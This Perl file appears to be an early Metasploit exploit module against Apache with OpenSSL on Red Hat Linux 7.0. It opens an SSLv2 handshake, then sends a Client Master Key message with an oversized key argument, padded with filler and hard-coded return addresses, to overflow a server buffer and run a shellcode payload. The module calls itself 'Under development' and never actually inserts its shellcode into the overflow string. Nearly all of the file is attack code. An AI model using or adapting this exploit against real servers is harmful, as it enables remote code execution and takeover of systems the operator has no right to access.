package Msf::Exploit::apache_openssl_masterkey;
use base "Msf::Exploit";
use strict;
my $info =
{
    'Name'  => 'Apache OpenSSL Master Key',
    'Version'  => '1.0',
    'Author'  => 'H D Mooore <hdm[at]metasploit.com> [Artistic License]',
    'Arch'  => [ 'x86' ],
    'OS'    => [ 'linux' ],
    'Priv'  => 1,
    'UserOpts'  => {
                    'RHOST' => [1, 'ADDR', 'The target address'],
                    'RPORT' => [1, 'PORT', 'The target port', 80],
                },

    'Payload' => {
                 'Space'     => 512,
                 'BadChars'  => "\x00",
               },
    
    'Desc'  => " Under development",
                
    'Refs'  =>  [  
                    ' '
                ],
    'Targets' => [
                   ['Red Hat Linux 7.0', 0x0809251c],
                 ],
};

sub new {
  my $class = shift;
  my $self = $class->SUPER::new({'Info' => $info}, @_);
  return($self);
}

sub Exploit {
    my $self = shift;
    my $target_host = $self->GetVar('RHOST');
    my $target_port = $self->GetVar('RPORT');
    my $target_idx  = $self->GetVar('TARGET');
    my $shellcode   = $self->GetVar('EncodedPayload')->Payload;

    my ($s, $ciph, $conn) = $self->sslv2_hello($target_host, $target_port);
    if (! $s) { exit(0) }
    
    
    my $ekey = ("A" x 128);
    my $karg = "X" x 1600;
    
    substr($karg, 332, 4, pack("L", 0xffeec313 + 315));
    substr($karg, 164, 4, pack("L", 0x0809251c));
    substr($karg, 800, 4, pack("L", 0x0809251c));
    
    my $key_data =
        pack("C", 2).               # SSL Client Master Key
        $ciph  .                    # Cipher
        pack("n", 0).               # Clear Key Data Length
        pack("n", 128).             # Encrypted Key Data Length
        pack("n", length($karg)).   # Key Argument Length
        $ekey.
        $karg;
    
    print "[*] Sending Client Master Key Overflow string\n";
    $s->send($self->ssl_length($key_data) . $key_data);
    my $res = $s->recv(2);
    
}


sub sslv2_hello
{
    my ($self, $host, $port) = @_;
    my $s = Msf::Socket->new();
    if (! $s->tcp($host, $port))
    {
        print STDERR "[*] Error establishing connection: " . $s->get_error . "\n";
        return undef;
    }

    my $type = 1;
    my $vers = 2;
    my $ssln = 0;
    my $chln = 16;


    my $ciphers = $self->get_ciphers();
    my $ssldata = pack("Cnnnn", $type, $vers, length($ciphers), $ssln, $chln) . $ciphers . "A" x 16;
    my $ssl = $self->ssl_length($ssldata) . $ssldata;

    printf("[*] Sending Client Hello...\n");
    $s->send($ssl);
    
    my $res = $s->recv(1);
    
    my ($cyp, $cid) = $self->sslv2_parse_server_hello($res);
    
    return($s, $cyp, $cid);
}

sub sslv2_parse_server_hello
{
    my ($self, $data) = @_;
    
    my $pack_len = unpack("n", substr($data, 0, 2)) - 0x8000;
    my $cert_len = unpack("n", substr($data, 7, 2));
    my $ciph_len = unpack("n", substr($data, 9, 2));
    my $conn_len = unpack("n", substr($data, 11, 2));
    
    # print("DATA: $pack_len | $cert_len | $ciph_len | $conn_len\n");
    
    my $cert = substr($data, 13, $cert_len);
    my $ciph = substr($data, 13 + $cert_len, $ciph_len);
    my $conn = substr($data, 13 + $cert_len + $ciph_len, $conn_len);
    
    # print "Ciph: " . unpack("H*", $ciph) . "\n";
    # print "Conn: " . unpack("H*", $conn) . "\n";

    return(substr($ciph, 0, 3), $conn);
}

sub ssl_length
{
    my ($self, $data) = @_;
    return(pack("n", length($data) + 0x8000));
}

sub get_ciphers
{
    my ($self) = @_;
    my $ciph;
    
    $ciph .= "\x07\x00\xc0";
    $ciph .= "\x05\x00\x80";
    $ciph .= "\x03\x00\x80";
    $ciph .= "\x01\x00\x80";
    $ciph .= "\x08\x00\x80";
    $ciph .= "\x06\x00\x40";

    return $ciph;
}

sub get_challenge
{
    my ($self, $chln) = @_;
    my $chal;
    for (1 .. $chln) { $chal .= chr(rand()*256) }
    return $chal;
}


1;
